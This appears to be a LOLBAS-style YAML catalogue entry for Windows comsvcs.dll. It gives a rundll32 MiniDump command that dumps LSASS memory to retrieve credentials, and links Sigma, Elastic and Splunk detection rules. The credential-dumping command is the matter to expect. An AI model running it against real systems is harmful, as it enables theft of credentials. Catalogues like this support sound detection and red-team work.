---
Name: Comsvcs.dll
Description: COM+ Services
Author:
Created: 2019-08-30
Commands:
  - Command: rundll32 C:\windows\system32\comsvcs.dll MiniDump "[LSASS_PID] dump.bin full"
    Description: Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.
    Usecase: Dump Lsass.exe process memory to retrieve credentials.
    Category: Dump
    Privileges: SYSTEM
    MitreID: T1003.001
    OperatingSystem: Windows
Full_Path:
  - Path: c:\windows\system32\comsvcs.dll
Code_Sample:
  - Code: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/rules/windows/process_creation/win_process_dump_rundll32_comsvcs.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/rules/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_comsvcs_procdump.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml
  - Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/dump_lsass_via_comsvcs_dll.yml
Resources:
  - Link: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
Acknowledgement:
  - Person: modexp
    Handle:
---
